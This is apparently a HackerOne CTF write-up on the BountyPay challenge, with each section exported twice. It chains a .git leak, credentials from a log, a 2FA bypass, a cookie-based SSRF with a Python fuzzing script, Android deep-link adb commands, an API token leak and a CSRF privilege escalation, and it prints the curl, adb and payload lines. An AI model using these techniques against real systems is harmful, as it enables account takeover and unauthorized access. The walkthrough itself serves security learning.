profile.name: h1-ctf
profile.about: Please help us stop the Grinch!

activities.message:
After more than 20 hours I were able to complete the CTF and get the final flag.  
On this writeup I will try to explain which paths I took and what I've learned walking through them. I draw an image with the paths I took in order to solve the challenge.

![Paths](./graph.png)

Thank you very much for this CTF, since I'm studying reverse engineering android latelly the android part of this challenge were really helpful.  

# Reconnaissance
The first tweet about the CTF

![Paths](./h1ctfannounce.png)

And an interesting retweet.

![Paths](./bountypayt1.png)

Lead me to the BountyPay HQ twitter, the most recent tweet was about a new employee called Sandra, then I head to "followed by" page and Sandra Alisson was there. Clicking on Sandra's profile we could see that she took a picture of her badge with a barcode.

![Paths](./bountypayt2.png)

Seeing this great art, the announcement tweet and Sandra's badge, I went right to @h1-ctf program page to try this challenge.  

After reading the rules and description I saw that the scope were a wildcard subdomain `*.bountypay.h1ctf.com`, so let's begin the recon!  
Running [amass](https://github.com/OWASP/Amass) resulted in some interesting subdomains.  
```bash
[key@chain h1-ctf]λ amass enum --passive -d bountypay.h1ctf.com
bountypay.h1ctf.com
# Querying messages
api.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
253awww.bountypay.h1ctf.com
software.bountypay.h1ctf.com
owasp_needs_upgrade_failed_to_send_a_nonce.bountypay.h1ctf.com
www.bountypay.h1ctf.com
2b-www.bountypay.h1ctf.com
app.bountypay.h1ctf.com
20-www.bountypay.h1ctf.com
3awww.bountypay.h1ctf.com

OWASP Amass v3.5.4                                https://github.com/OWASP/Amass
--------------------------------------------------------------------------------
11 names discovered - cert: 2, api: 1, dns: 1, scrape: 7
```
Now that we have those 4 subdomains let's see how they look like on browser, but after this let's run some small fuzzing with [ffuf](https://github.com/ffuf/ffuf/) to see if we find a hidden page or directory.

app.bountypay.h1ctf.com

![Software subdomain](./appsub.png)

On this one we can see only a login page, I thought about login bypass and tried some combinations of Sandra with her leaked badge, nothing worked.

staff.bountypay.h1ctf.com

![Software subdomain](./staffsub.png)

This page seems interesting, we have a login page and a `template` parameter, so I tried some well known names in this parameter, like `admin`, `user`, `staff`, and I could find that `admin` exists and returned `No Access to this resource`. With this in mind I tried some parameter polution to see if I could load admin page but with the backend thinking that I'm loading the login page. Then I discovered that I could load two templates with one request by the payload `?template[]=admin&template[]=login`.

api.bountypay.h1ctf.com

![Software subdomain](./apisub.png)

This has just a link to `/redirect?url=https://www.google.com/search?q=REST+API`, so I tried running some open redirects payloads but everything was leading me to `URL NOT FOUND IN WHITELIST`, then I realized that I was wasting time with this and went to another subdomain.

software.bountypay.h1ctf.com

![Software subdomain](./softwaresub.png)

We can't access this page at all, then I went back to api and tried a redirect to software subdomain but got 401 again.

With nothing working I was starting to feel sad and even tried some stego tools on Sandra's picture, then I remembered that I was running ffuf and looked into the terminal, ffuf said to me that `.git` was `403 forbidden` on `app.bountypay.h1ctf.com` and then I realized this could be the first step.
activities.markdown_message:
After more than 20 hours I were able to complete the CTF and get the final flag.

On this writeup I will try to explain which paths I took and what I've learned walking through them. I draw an image with the paths I took in order to solve the challenge.

![Paths](./graph.png)

Thank you very much for this CTF, since I'm studying reverse engineering android latelly the android part of this challenge were really helpful.

Reconnaissance

The first tweet about the CTF

![Paths](./h1ctfannounce.png)

And an interesting retweet.

![Paths](./bountypayt1.png)

Lead me to the BountyPay HQ twitter, the most recent tweet was about a new employee called Sandra, then I head to "followed by" page and Sandra Alisson was there. Clicking on Sandra's profile we could see that she took a picture of her badge with a barcode.

![Paths](./bountypayt2.png)

Seeing this great art, the announcement tweet and Sandra's badge, I went right to @h1-ctf program page to try this challenge.

After reading the rules and description I saw that the scope were a wildcard subdomain *.bountypay.h1ctf.com, so let's begin the recon!

Running amass resulted in some interesting subdomains. 

[key@chain h1-ctf]λ amass enum --passive -d bountypay.h1ctf.com
bountypay.h1ctf.com
# Querying messages
api.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
253awww.bountypay.h1ctf.com
software.bountypay.h1ctf.com
owasp_needs_upgrade_failed_to_send_a_nonce.bountypay.h1ctf.com
www.bountypay.h1ctf.com
2b-www.bountypay.h1ctf.com
app.bountypay.h1ctf.com
20-www.bountypay.h1ctf.com
3awww.bountypay.h1ctf.com

OWASP Amass v3.5.4                                https://github.com/OWASP/Amass
--------------------------------------------------------------------------------
11 names discovered - cert: 2, api: 1, dns: 1, scrape: 7

Now that we have those 4 subdomains let's see how they look like on browser, but after this let's run some small fuzzing with ffuf to see if we find a hidden page or directory.

app.bountypay.h1ctf.com

![Software subdomain](./appsub.png)

On this one we can see only a login page, I thought about login bypass and tried some combinations of Sandra with her leaked badge, nothing worked.

staff.bountypay.h1ctf.com

![Software subdomain](./staffsub.png)

This page seems interesting, we have a login page and a template parameter, so I tried some well known names in this parameter, like admin, user, staff, and I could find that admin exists and returned No Access to this resource. With this in mind I tried some parameter polution to see if I could load admin page but with the backend thinking that I'm loading the login page. Then I discovered that I could load two templates with one request by the payload ?template[]=admin&template[]=login.

api.bountypay.h1ctf.com

![Software subdomain](./apisub.png)

This has just a link to /redirect?url=https://www.google.com/search?q=REST+API, so I tried running some open redirects payloads but everything was leading me to URL NOT FOUND IN WHITELIST, then I realized that I was wasting time with this and went to another subdomain.

software.bountypay.h1ctf.com

![Software subdomain](./softwaresub.png)

We can't access this page at all, then I went back to api and tried a redirect to software subdomain but got 401 again.

With nothing working I was starting to feel sad and even tried some stego tools on Sandra's picture, then I remembered that I was running ffuf and looked into the terminal, ffuf said to me that .git was 403 forbidden on app.bountypay.h1ctf.com and then I realized this could be the first step.

activities.message:
# First log in

Running [git-dumper](https://github.com/arthaud/git-dumper) I was able to get some interesting files from the server, reading the config file from .git directory, it leaked a [github repository](https://github.com/bounty-pay-code/request-logger.git) with only one file `logger.php`.

```php
$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND);
```

Nice!! We have a file that is probably in the server, let's try to download it. Downloading `bp_web_trace.log` and decoding it we could leak a username and password from it.
```
1588931909:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
1588931919:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
1588931928:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
1588931945:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```
Trying the credentials from this log file we could log in, but now we have to bypass the 2FA.

![First 2FA](./login1.png)

Seeing the 2FA source code page we could see an interesting HTML
```html
<input type="hidden" name="username" value="brian.oliver">
<input type="hidden" name="password" value="V7h0inzX">
<input type="hidden" name="challenge" value="1dfd2b21c3c7d3cc08ce69d2eaa4b63d">
```
So my first try was to change this hash to `md5(bD83Jk27dQ)=5828c689761cce705a1c84d9b1a1ed5e` and send `bD83Jk27dQ` as the password, and the bypass were complete. Logged in I was able to load transactions from a month, then I tried to load `04/2020` because of the log file.

![After login](./login2.png)
activities.markdown_message:
First log in

Running git-dumper I was able to get some interesting files from the server, reading the config file from .git directory, it leaked a github repository with only one file logger.php.

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND);

Nice!! We have a file that is probably in the server, let's try to download it. Downloading bp_web_trace.log and decoding it we could leak a username and password from it.

1588931909:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
1588931919:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
1588931928:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
1588931945:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}

Trying the credentials from this log file we could log in, but now we have to bypass the 2FA.

![First 2FA](./login1.png)

Seeing the 2FA source code page we could see an interesting HTML

<input type="hidden" name="username" value="brian.oliver">
<input type="hidden" name="password" value="V7h0inzX">
<input type="hidden" name="challenge" value="1dfd2b21c3c7d3cc08ce69d2eaa4b63d">

So my first try was to change this hash to md5(bD83Jk27dQ)=5828c689761cce705a1c84d9b1a1ed5e and send bD83Jk27dQ as the password, and the bypass were complete. Logged in I was able to load transactions from a month, then I tried to load 04/2020 because of the log file.

![After login](./login2.png)

activities.message:
# SSRF inside cookie This request I made were calling me for a api fuzz, with the fuzzingg on background I looked for the session cookies. The only cookie I've found was `token` with a base64 string associated, this cookie were not HttpOnly and not secure, then I decoded it and it were a json string. ```bash [key@chain h1-ctf]λ echo -n eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d {"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"} ``` This looks pretty straightforward, we must do an IDOR with Sandra's badge and type juggling the hash! So with the payload in hands and the transactions request I saw that I was completely wrong, but also the type juggling was true. I also tried IDORing the pay endpoint, that I've found on `app.js` file, but could not find anything. ![Not an idor](./noidor.png) By this request I was able to see that I could craft a url changing the `account_id` parameter on cookie. Firstly we will ignore the last part `/statements?month=04&year=2020` with a #, this will change this part into a fragment and it worked as expected. ![Still not an idor](./noidor2.png) Ok, let's try to see some paths on api, like api/staff (found by background fuzzing). None of the paths worked. Some hours later I thought, "Now we can just test if `/redirect` will work as SSRF, if it follows redirect then we can see `software.bountypay.h1ctf.com`", executing this thought with the payload `../../../../redirect?url=https://software.bountypay.h1ctf.com/#` I were able to see the login page on the response `data` attribute. ![Software login page](./softwarelogin.png) Since it were night and I were tired, I wrote a quick script to fuzz this subdomain and put it to run with a dictionary and went to sleep. ```python import requests import base64 import json session = requests.Session() APP_ENDPOINT_NOSCHEMA = "app.bountypay.h1ctf.com" APP_ENDPOINT = f"https://{APP_ENDPOINT_NOSCHEMA}" SOFTWARE_ENDPOINT = "https://software.bountypay.h1ctf.com" with open("storage.dict") as f: path = f.readline()[:-1] token_base = {} while path: token_base["account_id"] = f"../../../../../../redirect?url={SOFTWARE_ENDPOINT}/{path}#" token_base["hash"] = 0 token = base64.b64encode(json.dumps(token_base).encode()).decode() session.cookies.set("token", token, path='/', domain=APP_ENDPOINT_NOSCHEMA) r = session.get(f"{APP_ENDPOINT}/statements?month=02&year=2020") if "Not Found" not in r.json()['data']: print(f"Found! {path}\n\n{r.json()['data']}") path = f.readline()[:-1] ``` Waking up the next morning I got a really cool finding. ```html Found! uploads Index of /uploads/

Index of /uploads/

../
BountyPay.apk                                        20-Apr-2020 11:26              4043701
``` Then I tried to fetch it with my browser and downloaded the file.
activities.markdown_message:
SSRF inside cookie

This request I made were calling me for a api fuzz, with the fuzzingg on background I looked for the session cookies. The only cookie I've found was token with a base64 string associated, this cookie were not HttpOnly and not secure, then I decoded it and it were a json string.

[key@chain h1-ctf]λ echo -n eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}

This looks pretty straightforward, we must do an IDOR with Sandra's badge and type juggling the hash! So with the payload in hands and the transactions request I saw that I was completely wrong, but also the type juggling was true. I also tried IDORing the pay endpoint, that I've found on app.js file, but could not find anything.

![Not an idor](./noidor.png)

By this request I was able to see that I could craft a url changing the account_id parameter on cookie. Firstly we will ignore the last part /statements?month=04&year=2020 with a #, this will change this part into a fragment and it worked as expected.

![Still not an idor](./noidor2.png)

Ok, let's try to see some paths on api, like api/staff (found by background fuzzing). None of the paths worked. Some hours later I thought, "Now we can just test if /redirect will work as SSRF, if it follows redirect then we can see software.bountypay.h1ctf.com", executing this thought with the payload ../../../../redirect?url=https://software.bountypay.h1ctf.com/# I were able to see the login page on the response data attribute.

![Software login page](./softwarelogin.png)

Since it were night and I were tired, I wrote a quick script to fuzz this subdomain and put it to run with a dictionary and went to sleep.

import requests
import base64
import json
session = requests.Session()

APP_ENDPOINT_NOSCHEMA = "app.bountypay.h1ctf.com"
APP_ENDPOINT = f"https://{APP_ENDPOINT_NOSCHEMA}"
SOFTWARE_ENDPOINT = "https://software.bountypay.h1ctf.com"

with open("storage.dict") as f:
    path = f.readline()[:-1]
    token_base = {}
    while path:
        token_base["account_id"] = f"../../../../../../redirect?url={SOFTWARE_ENDPOINT}/{path}#"
        token_base["hash"] = 0
        token = base64.b64encode(json.dumps(token_base).encode()).decode()
        session.cookies.set("token", token, path='/', domain=APP_ENDPOINT_NOSCHEMA)
        r = session.get(f"{APP_ENDPOINT}/statements?month=02&year=2020")
        if "Not Found" not in r.json()['data']:
            print(f"Found! {path}\n\n{r.json()['data']}")
        path = f.readline()[:-1]

Waking up the next morning I got a really cool finding.

Found! uploads

<html>
<head><title>Index of /uploads/</title></head>
<body bgcolor="white">
<h1>Index of /uploads/</h1><hr><pre><a href="../">../</a>
<a href="/uploads/BountyPay.apk">BountyPay.apk</a>                                        20-Apr-2020 11:26              4043701
</pre><hr></body>
</html>

Then I tried to fetch it with my browser and downloaded the file.

Android magic

First thing I do when I see an .apk in a CTF is to run apktool and dex2jar. Second thing is to see what is going on at AndroidManifest.xml, reading this file I were able to recognize that there was four activities, and three important ones PartOneActivity, PartTwoActivity, PartThreeActivity. So let's install this apk on the emulator. After installing and opening the app, we face this screen.

![Android MainActivity](./android1.png)

Hitting submit lead us to PartOneActivity, so let's see the source code provided by dex2jar with jd-gui.

Part one

protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2131427358);
    setSupportActionBar((Toolbar)findViewById(2131231012));
    this.mFirebaseAnalytics = FirebaseAnalytics.getInstance((Context)this);
    SharedPreferences sharedPreferences = getSharedPreferences("user_created", 0);
    ((FloatingActionButton)findViewById(2131230845)).setOnClickListener(new View.OnClickListener() {
          public void onClick(View param1View) {
            PartOneActivity partOneActivity;
            if (PartOneActivity.this.click == 0) {
              Snackbar.make(param1View, "Deep links.", 0).setAction("Action", null).show();
              partOneActivity = PartOneActivity.this;
              partOneActivity.click++;
              return;
            } 
            if (PartOneActivity.this.click == 1) {
              Snackbar.make((View)partOneActivity, "Params.", 0).setAction("Action", null).show();
              PartOneActivity.this.click = 0;
            } 
          }
        });
    if (!sharedPreferences.contains("USERNAME")) {
      Toast.makeText(getApplicationContext(), "Please create a CTF username :)", 0).show();
      startActivity(new Intent((Context)this, MainActivity.class));
    } 
    if (getIntent() != null && getIntent().getData() != null) {
      String str = getIntent().getData().getQueryParameter("start");
      if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
        str = sharedPreferences.getString("USERNAME", "");
        SharedPreferences.Editor editor = sharedPreferences.edit();
        String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
        editor.putString("PARTONE", "COMPLETE").apply();
        logFlagFound(str, str1);
        startActivity(new Intent((Context)this, PartTwoActivity.class));
      } 
    } 
  }

![Android PartOneActivity](./androidp1.png)

Hitting the BountyPay button two times show us two hints:

  1. Deep Links.
  2. Params.

After searching for deep links I could find the documentation and how to call it, so, by the source code and manifest file, we need a deep link one://part with a start parameter equals to PartTwoActivity and it will go to part two. Then our payload is:

adb shell am start -a android.intent.action.VIEW -d one://part/?start=PartTwoActivity bounty.pay

Part two

protected void onCreate(Bundle paramBundle) {
    //...
    if (getIntent() != null && getIntent().getData() != null) {
      Uri uri = getIntent().getData();
      String str1 = uri.getQueryParameter("two");
      String str2 = uri.getQueryParameter("switch");
      if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
        editText.setVisibility(0);
        button.setVisibility(0);
        textView.setVisibility(0);
      } 
    } 
  }

  public void submitInfo(View paramView) {
    final String post = ((EditText)findViewById(2131230834)).getText().toString();
    this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
          //...
          public void onDataChange(DataSnapshot param1DataSnapshot) {
            String str1 = (String)param1DataSnapshot.getValue();
            SharedPreferences sharedPreferences = PartTwoActivity.this.getSharedPreferences("user_created", 0);
            SharedPreferences.Editor editor = sharedPreferences.edit();
            String str2 = post;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("X-");
            stringBuilder.append(str1);
            if (str2.equals(stringBuilder.toString())) {
              str1 = sharedPreferences.getString("USERNAME", "");
              String str = sharedPreferences.getString("TWITTERHANDLE", "");
              PartTwoActivity.this.logFlagFound(str1, str);
              editor.putString("PARTTWO", "COMPLETE").apply();
              PartTwoActivity.this.correctHeader();
              return;
            } 
            Toast.makeText((Context)PartTwoActivity.this, "Try again! :D", 0).show();
          }
        });
  }

The hints for part two are:

  1. Currently invisible.
  2. Visible with the right params.

On this one we need a deep link two://part with parameters two equals to light and switch equals to on, then we just need to run:

adb shell am start -a android.intent.action.VIEW -d "two://part/?two=light\&switch=on" bounty.pay

![Android PartTwoActivity](./androidp2.png)

With this screen in my front and after read the source code we can see that this hash appended to "X-" is the right value for the header. Then we need to find out what is this hash (459a6f79ad9b13cbcb5f692d2cc7a94d), since my computer is not that good I first try to crack the hash on a website

![Crackstation](./crackstation.png)

Ok, now we know that the header is X-Token.

Part three

protected void onCreate(Bundle paramBundle) {
    //...
    if (getIntent() != null && getIntent().getData() != null) {
      Uri uri = getIntent().getData();
      final String firstParam = uri.getQueryParameter("three");
      final String secondParam = uri.getQueryParameter("switch");
      final String thirdParam = uri.getQueryParameter("header");
      byte[] arrayOfByte2 = Base64.decode(str1, 0);
      byte[] arrayOfByte1 = Base64.decode(str2, 0);
      final String decodedFirstParam = new String(arrayOfByte2, StandardCharsets.UTF_8);
      final String decodedSecondParam = new String(arrayOfByte1, StandardCharsets.UTF_8);
      this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onCancelled(DatabaseError param1DatabaseError) {
              Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
            }

            public void onDataChange(DataSnapshot param1DataSnapshot) {
              String str = (String)param1DataSnapshot.getValue();
              if (firstParam != null && decodedFirstParam.equals("PartThreeActivity") && secondParam != null && decodedSecondParam.equals("on")) {
                String str1 = thirdParam;
                if (str1 != null) {
                  StringBuilder stringBuilder = new StringBuilder();
                  stringBuilder.append("X-");
                  stringBuilder.append(str);
                  if (str1.equals(stringBuilder.toString())) {
                    editText.setVisibility(0);
                    button.setVisibility(0);
                    PartThreeActivity.this.thread.start();
                  } 
                } 
              } 
            }
          });
    } 
  }

public String performPostCall(String paramString) {
    SharedPreferences sharedPreferences = getSharedPreferences("user_created", 0);
    String str1 = sharedPreferences.getString("HOST", "");
    String str2 = sharedPreferences.getString("TOKEN", "");
    Log.d("HOST IS: ", str1);
    Log.d("TOKEN IS: ", str2);
    try {
      HttpURLConnection httpURLConnection = (HttpURLConnection)(new URL(str1)).openConnection();
      httpURLConnection.setReadTimeout(10000);
      httpURLConnection.setConnectTimeout(15000);
      httpURLConnection.setRequestMethod("POST");
      httpURLConnection.setDoInput(true);
      httpURLConnection.setDoOutput(true);
      Uri.Builder builder = (new Uri.Builder()).appendQueryParameter("firstParam", paramString);
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("X-Token: ");
      stringBuilder.append(paramString);
      Log.d("HEADER VALUE AND HASH ", stringBuilder.toString());
      paramString = builder.build().getEncodedQuery();
      if (paramString != null) {
        OutputStream outputStream = httpURLConnection.getOutputStream();
        BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
        bufferedWriter.write(paramString);
        bufferedWriter.flush();
        bufferedWriter.close();
        outputStream.close();
        httpURLConnection.connect();
      } 
    } catch (IOException iOException) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("Post request did not send: ");
      stringBuilder.append(iOException);
      Log.e("tag", stringBuilder.toString());
    } 
    return "hi";
}

Seeing this piece of code we are aware that we need to pass an encoded "PartThreeActivity" to parameter three, an encoded on to param switch and the parameter header must be equal X-Token, so how should we encode it? It seems like Base64, because of variable arrayOfByte1. Then, if I'm not mistaken, the payload must be:

adb shell am start -a android.intent.action.VIEW -d "three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token" bounty.pay

![Android PartThreeActivity](./androidp3.png)

If we pay attention to the last function performPostCall we can see that the token is logged into logcat, then I just read logcat and leaked the token:

[key@chain h1-ctf]λ adb -d logcat | grep "HOST IS:"
06-10 21:12:14.904  8707  9216 D HOST IS: : http://api.bountypay.h1ctf.com
[key@chain h1-ctf]λ adb -d logcat | grep "TOKEN IS:"
06-10 21:12:14.904  8707  9216 D TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1
[key@chain h1-ctf]λ adb -d logcat | grep "HEADER VALUE AND HASH"
06-10 21:12:14.905  8707  9216 D HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1

activities.message:
# Finally Sandra Now that we have a master hash and the header value we can go to the api endpoints mapped. ```bash [key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" {"account_id":"F8gHiqSdpK","owner":"Mr Brian Oliver","company":"BountyPay Demo "} [key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" [{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}] [key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/staff/84DJKEIP38 -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" ["Endpoint Not Found"] [key@chain h1-ctf]λ curl -X POST https://api.bountypay.h1ctf.com/api/staff/84DJKEIP38 -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" ["Endpoint Not Found"] [key@chain h1-ctf]λ curl -X POST https://api.bountypay.h1ctf.com/api/staff/ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" ["Missing Parameter"] [key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/staff/ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -d "staff_id=STF:84DJKEIP38" ["Staff Member already has an account"] ``` After these many tries I thought about my friend Sandra! ```bash [key@chain h1-ctf]λ curl -X POST https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -d "staff_id=STF:8FJ3KFISL3" {"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"} ``` Now we can login inside `staff.bountypay.h1ctf.com`! # CSRF + privilege escalation I really don't know why but I thought this `%3D` on the password were `=`, but after this failure I was able to log in as Sandra. Inside the staff painel we can see 3 tabs, one is just a welcome message, one is for tickets and other is to change avatar and name. Lookingg for the source code of the page, we can see it loads a `website.js` and has the url you are accessing in base64. ![Staff page](./staff1.png) ```javascript $(".upgradeToAdmin").click(function() { let t = $('input[name="username"]').val(); $.get("/admin/upgrade?username=" + t, function() { alert("User Upgraded to Admin") }) }), $(".tab").click(function() { return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1 }), $(".sendReport").click(function() { $.get("/admin/report?url=" + url, function() { alert("Report sent to admin team") }), $("#myModal").modal("hide") }), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click")); ``` Watching for `website.js` we notice that if we call the fragment `#tabx` will trigger click of any element with the class `tabx`, we notice the presence of /admin/report, that uses the base64 url defined before the file and an event listener that triggers when an element with class `upgradeToAdmin` is clicked, also we need an username input field on page to pass as parameter to `/admin/upgrade?username=[input of username]`. With this in mind I were able to get the best idea ever, just send to admin the base64 of `/admin/upgrade?username=sandra.alisson`, with this sent I waited like 10 minutes and nothing happened. Then I just clicked the report link on footer and said that /admin was disabled. So, we have an input at avatar tab, we could maybe change it to a xss payload would work, or maybe change avatar. Then I intercepted the request and changed both to `` and went ahead to the ticket tab, but this happened. ![Staff page2](./staff2.png) Yes! Nothing cool happened, but I've noticed that `scriptalertscript` was a class name, then I killed it, it was so obvious that we needed to change it to `upgradeToAdmin` and use the report page with the parameter polution that we discovered at Recon stage. But we are missing something, we are missing the click trigger! So how can we trigger the click of avatar? On this piece of code we see that there is no tab4 element, then we can set the avatar to `upgradeToAdmin tab4` and it will trigger the click function if we pass `#tab4` as fragment of url. ```html
  • Home
  • Support Tickets
  • Profile
  • Logout
``` So let's intercept the avatar change again and put the right class on it, after we set the url to `/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab4`, that will trigger the tab4 click, then upgradeToAdmin click, then it will look for the value of an input with name username, that will be `sandra.allison`, all this will happen because admin will read the ticket. Encoding this to base64 and sending to /admin/report should work fine. The final url will be `https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ==`. Going to this url and reloading the page will escate us to admin. ![Marten is owned](./staff3.png) Now we have Marten's password!
activities.markdown_message:
Finally Sandra

Now that we have a master hash and the header value we can go to the api endpoints mapped.

[key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
{"account_id":"F8gHiqSdpK","owner":"Mr Brian Oliver","company":"BountyPay Demo "}
[key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
[key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/staff/84DJKEIP38 -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
["Endpoint Not Found"]
[key@chain h1-ctf]λ curl -X POST https://api.bountypay.h1ctf.com/api/staff/84DJKEIP38 -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
["Endpoint Not Found"]
[key@chain h1-ctf]λ curl -X POST https://api.bountypay.h1ctf.com/api/staff/ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
["Missing Parameter"]
[key@chain h1-ctf]λ curl https://api.bountypay.h1ctf.com/api/staff/ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -d "staff_id=STF:84DJKEIP38"
["Staff Member already has an account"]

After these many tries I thought about my friend Sandra!

[key@chain h1-ctf]λ curl -X POST https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -d "staff_id=STF:8FJ3KFISL3"
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}

Now we can login inside staff.bountypay.h1ctf.com!

CSRF + privilege escalation

I really don't know why but I thought this %3D on the password were =, but after this failure I was able to log in as Sandra. Inside the staff painel we can see 3 tabs, one is just a welcome message, one is for tickets and other is to change avatar and name. Lookingg for the source code of the page, we can see it loads a website.js and has the url you are accessing in base64.

![Staff page](./staff1.png)

$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}),
$(".tab").click(function() {
    return $(".tab").removeClass("active"),
    $(this).addClass("active"),
    $("div.content").addClass("hidden"),
    $("div.content-" + $(this).attr("data-target")).removeClass("hidden"),
    !1
}),
$(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }),
    $("#myModal").modal("hide")
}),
document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"),
"#tab2" === document.location.hash && $(".tab2").trigger("click"),
"#tab3" === document.location.hash && $(".tab3").trigger("click"),
"#tab4" === document.location.hash && $(".tab4").trigger("click"));

Watching for website.js we notice that if we call the fragment #tabx will trigger click of any element with the class tabx, we notice the presence of /admin/report, that uses the base64 url defined before the file and an event listener that triggers when an element with class upgradeToAdmin is clicked, also we need an username input field on page to pass as parameter to /admin/upgrade?username=[input of username]. With this in mind I were able to get the best idea ever, just send to admin the base64 of /admin/upgrade?username=sandra.alisson, with this sent I waited like 10 minutes and nothing happened. Then I just clicked the report link on footer and said that /admin was disabled.

So, we have an input at avatar tab, we could maybe change it to a xss payload would work, or maybe change avatar. Then I intercepted the request and changed both to <script>alert()</script> and went ahead to the ticket tab, but this happened.

![Staff page2](./staff2.png)

